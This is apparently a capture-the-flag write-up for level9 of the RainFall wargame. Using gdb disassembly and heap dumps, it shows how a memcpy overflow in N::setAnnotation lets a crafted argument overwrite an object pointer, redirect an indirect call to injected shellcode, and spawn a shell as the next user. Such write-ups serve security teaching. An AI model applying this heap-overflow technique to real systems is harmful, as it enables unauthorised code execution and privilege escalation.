# This function exits if argc < 2 :

	0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp) <== (argc)
	0x08048602 <+14>:	jg     0x8048610 <main+28>

# When checking the disassembly of this function :

   	0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>

# We can see that there is an exploitable heap buffer overflow :

Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.

# This function takes two arguments, as seen by the offsets from $ebp.
# The second parameter is at 0xc(%ebp) and the first one at 0x8(%ebp).
# This functions computes the length of the second argument and copies it at the
# location of the first :

Breakpoint 4, 0x08048722 in N::setAnnotation(char*) ()
(gdb) disas
	[...]
	0x0804871a <+12>:	call   0x8048520 <strlen@plt>
	0x0804871f <+17>:	mov    0x8(%ebp),%edx
=> 	0x08048722 <+20>:	add    $0x4,%edx

(gdb) i r
eax            0x4	4
ecx            0x17	23
edx            0x804a008

(gdb) x/60wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x00000000 <== first word of buf
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000 <== last word of buf
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000

# As we can see from this heap dump, there are two variables of the same kind
# declared on the heap.
# The data type is as follows :

class N {
	void *p;
	char buf[104];
	int	i;
	...
} => 4 + 104 + 4 = 112 bytes

# We can see that it matches the size visible in the malloc header :
71 - 1 bit = 0x70 = 112 bytes

# When memcpy is called, the buffer stored at 0x804a00c is filled :

After memcpy(var1.buf, argv[1], strlen(argv[1]));

(gdb) x/8wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x6f746f74 <== "toto"
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000

# Back to the main function, we can see this piece of assembly :

0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
0x0804867c <+136>:	mov    0x10(%esp),%eax
0x08048680 <+140>:	mov    (%eax),%eax
0x08048682 <+142>:	mov    (%eax),%edx

# The variable at offset 0x10(%esp) corresponds to the address of the second
# variable on the heap :

=> 0x0804867c <+136>:	mov    0x10(%esp),%eax

(gdb) x/wx $esp+0x10
0xbffff6e0:	0x0804a078

0x804a070:	0x00000005	0x00000071	0x08048848	<== 0x00000000

# Then the address now contained in $eax, which is basically the address of the
# first member of the second object, is dereferenced twice.
# Here we can exploit the fact that there is a call made with the address
# stored at 0x804a078 to redirect the flow of execution of the program.
# We can put together a shellcode injection that will use the following payload :

[SHELLCODE_ADDR] [SHELLCODE] [PADDING] [BUFFER_ADDR]
	0x804a010        '...'    'AAA...'  	0x804a00c
        |--------------^                        |
        ^---------------------------------------|

# This will be the state of the heap once the payload is loaded in memory :

(gdb) x/60wx 0x804a000
0x804a000: 0x00000000 0x00000071 0x08048848 0x0804a010<-
                 v---------------------------------|    |
0x804a010: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
0x804a020: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
0x804a030: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
0x804a040: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
0x804a050: 0xSSSSSSSS 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA  |
0x804a060: 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA  |
0x804a070: 0xAAAAAAAA 0xAAAAAAAA 0x0804a00c 0x00000000  |
                                        |---------------|

   0x0804867c <+136>:	mov    0x10(%esp),%eax <== $eax = var2;
   0x08048680 <+140>:	mov    (%eax),%eax <== $eax = var2->p = 0x804a00c;
   0x08048682 <+142>:	mov    (%eax),%edx <== $edx = *$eax = 0x804a010;

# Then :

   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx <== (*0x0804a010)(var2, var1);

# I'm not sure of the actual call being made here if there is no payload.

# And finally :

level9@RainFall:~$ ./level9 `python /tmp/payload.py`
$ whoami
bonus0
